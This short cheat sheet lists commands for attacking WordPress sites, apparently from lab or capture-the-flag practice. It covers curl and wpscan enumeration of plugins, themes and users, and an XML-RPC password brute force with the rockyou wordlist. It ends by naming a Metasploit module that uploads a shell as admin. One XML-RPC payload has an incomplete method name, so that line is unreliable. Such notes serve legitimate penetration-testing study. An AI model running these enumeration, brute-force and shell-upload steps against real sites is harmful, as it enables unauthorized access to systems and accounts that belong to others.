#Directory Indexing
curl -s -X GET http://TARGET/wp-content/plugins/mail-masta/ | html2text

#Enumerate plugins
curl -s -X GET http://94.237.62.195:58767 | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2

#Enumerate Themes
curl -s -X GET http://tenten.htb | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2

#Enumerate Users METHOD 1
curl -s -I -X GET http://blog.inlanefreight.com/?author=1

#METHOD 2
curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq

#Basic Wpscan
wpscan --url TARGET --log
wpscan --url http://tenten.htb --enumerate u --log

#Login BruteForce API XMLRPC
curl -X POST -d "<methodCall><methodName>system.</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://tenten.htb/xmlrpc.php
wpscan --password-attack xmlrpc -t 20 -U takis -P /usr/share/wordlists/rockyou.txt --url http://tenten.htb

#METASPLOIT MODULE WITH CREDS
exploit/unix/webapp/wp_admin_shell_upload